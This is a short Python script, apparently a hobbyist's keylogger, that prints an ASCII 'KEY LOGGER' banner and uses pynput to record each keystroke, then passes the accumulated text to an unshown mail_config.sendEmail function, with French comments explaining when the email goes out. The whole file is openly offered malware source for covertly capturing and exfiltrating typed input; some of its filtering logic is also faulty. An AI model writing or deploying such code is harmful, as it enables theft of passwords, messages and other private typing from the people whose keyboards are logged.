# Key Logger via logs email

import colorama
from colorama import Fore, Style, Back
colorama.init()
print(Fore.RED + '██╗  ██╗███████╗██╗   ██╗    ██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ ')
print(Fore.RED + '██║ ██╔╝██╔════╝╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗')
print(Fore.RED + '█████╔╝ █████╗   ╚████╔╝     ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝')
print(Fore.WHITE + '██╔═██╗ ██╔══╝    ╚██╔╝      ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗')
print(Fore.WHITE + '██║  ██╗███████╗   ██║       ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║')
print(Fore.WHITE + '╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝')

import pynput
from pynput.keyboard import Key, Listener
import mail_config

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed") # ajoute le # devant cette ligne pour retirer les logs cmd
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10: # Quand l'utilisateur aura toucher (count)x sont clavier alors l'email sera envoyer
        count = 0
        email(keys)

def email(keys):
    logs = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        logs += k
        if key == "Key.enter":
            k = "      "
            mail_config.sendEmail(logs)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
